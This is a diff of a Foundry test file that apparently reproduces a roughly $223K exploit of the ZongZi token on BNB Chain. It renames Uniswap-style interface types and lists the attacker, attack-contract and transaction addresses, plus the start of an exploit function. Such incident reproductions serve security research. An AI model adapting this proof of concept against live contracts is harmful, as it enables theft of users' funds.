@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~$223K
 // Attacker : https://bscscan.com/address/0x2c42824ef89d6efa7847d3997266b62599560a26
@@ -25,9 +24,9 @@ contract ContractTest is Test {
 
     IWETH private constant WBNB = IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 private constant ZongZi = IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
-    Uni_Pair_V2 private constant BUSDT_WBNB = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
-    Uni_Pair_V2 private constant WBNB_ZONGZI = Uni_Pair_V2(0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe);
-    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Pair private constant BUSDT_WBNB = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
+    IUniswapV2Pair private constant WBNB_ZONGZI = IUniswapV2Pair(0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe);
+    IUniswapV2Router private constant Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     address private constant attackContract = 0x0bd0D9BA4f52dB225B265c3Cffa7bc4a418D22A9;
     bytes32 private constant attackTx = hex"247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f";
 
@@ -76,7 +75,7 @@ contract Helper {
     IWETH private constant WBNB = IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 private constant ZongZi = IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
     IZZF private constant ZZF = IZZF(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b);
-    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router private constant Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
     function exploit() external {
         WBNB.approve(address(Router), type(uint256).max);
